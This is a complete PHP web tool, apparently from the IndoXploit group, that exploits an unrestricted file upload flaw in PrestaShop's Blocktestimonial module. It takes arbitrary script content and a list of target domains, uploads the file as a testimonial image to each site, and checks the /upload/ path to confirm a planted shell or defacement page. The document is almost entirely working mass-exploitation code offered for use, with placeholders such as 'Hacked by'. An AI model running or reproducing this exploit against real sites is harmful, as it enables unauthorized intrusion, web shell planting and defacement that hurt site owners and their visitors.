<html>
	<head>
	<title>Prestashop Blocktestimonial Modules File Upload</title>
	<meta charset="UTF-8">
	<meta name="author" content="IndoXploit - l0c4lh34rtz">
<style type="text/css">
html {
	margin: 10px auto;
	color: #000000;
}
header {
	font-size: 40px;
	text-align: center;
	margin: 0px auto;
}
input[type=text] {
	padding: 7px;
	margin: 5px auto;
	margin-left: 30px;
	border: 0;
	border-bottom: 1px solid #000000;
	color: #bb0000;
	width: 250px;
	height: 25px;
	outline: none;
}
.btn {
  color: #ffffff;
  width: 250px;
  height: 25px;
  background: #000000;
  text-decoration: none;
}

.btn:hover {
  cursor: pointer;
  text-decoration: none;
}
table {
	margin-left: 30px;
}
textarea {
	padding: 5px;
	resize: none;
	border: 1px solid #000000;
	width: 550px;
	height: 250px;
	outline: none;
}
</style>
</head>
<header>IndoXploit Tools - PS Modules Blocktestimonial File Upload</header>
<hr width="95%">
<table width="100%" align="center">
<form method="post" action="" enctype="multipart/form-data">
<tr><td><pre>Filename   : <input type="text" name="filename" placeholder="idx.php" required></td></tr>
<tr><td><pre>Script     : <br><textarea placeholder="Hacked by l0c4lh34rtz - IndoXploit" name="source" required></textarea></td>
<td><pre>Target     : <br><textarea placeholder="www.target.com" name="target" required></textarea></td>
</tr>
<tr><td><input type="submit" class="btn" name="exploit" value="Xploit"></td></tr>
</form>
</table>
<div style='margin: 5px auto; padding-left: 15px;'>
<?php
set_time_limit(0);
error_reporting(0);

function curl($url,$post,$data,$headers,$header,$cookie) {
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_URL, $url);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	if($post) {
	 	  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	}
	if($cookie) {
		  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
	} else {
		  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
	}
	if($headers) {
		  curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	}
	$exec = curl_exec($ch);
	$info = curl_getinfo($ch);
	return array(
		"http" => $info['http_code'],
		"response" => $exec
	);
		  curl_close($ch);
}

$filename = htmlspecialchars($_POST['filename']);
$script = $_POST['source'];
$domains = explode("\r\n", htmlspecialchars($_POST['target']));
$go = $_POST['exploit'];

if(isset($go)) {
	$handle = fopen($filename, "w");
	fwrite($handle, $script);
	fclose($handle);

	foreach($domains as $target) {
		if(!preg_match("/^http:\/\//", $target) AND !preg_match("/^https:\/\//", $target)) {
			$target = "http://$target/";
		}
		echo "[+] URL: $target<br>";
		$post = array(
			"testimonial_submitter_name" => "indoxploit",
			"testimonial_title" => "hacked by indoxploit",
			"testimonial_main_message" => "hacked by indoxploit",
			"testimonial_img" => "@$filename",
			"testimonial" => "Submit Testimonial",
		);
		$exploit = curl("$target/modules/blocktestimonial/addtestimonial.php", TRUE, $post, FALSE, NULL, TRUE);
		$cek_shell = curl("$target/upload/$filename", FALSE, NULL, FALSE, NULL, FALSE);
		if(preg_match("/Your testimonial was submitted successfully./", $exploit['response'])) {
			echo "[+] Successfully !<br>";
			if($cek_shell['http'] == 200) {
				echo "[+] $target/upload/$filename<br><br>";
			} else {
				echo "[+] Shell not Found :(<br><br>";
			}
		} else {
			echo "[+] Fail :(<br><br>";
		}
	}
}
?>
</div>
</html>
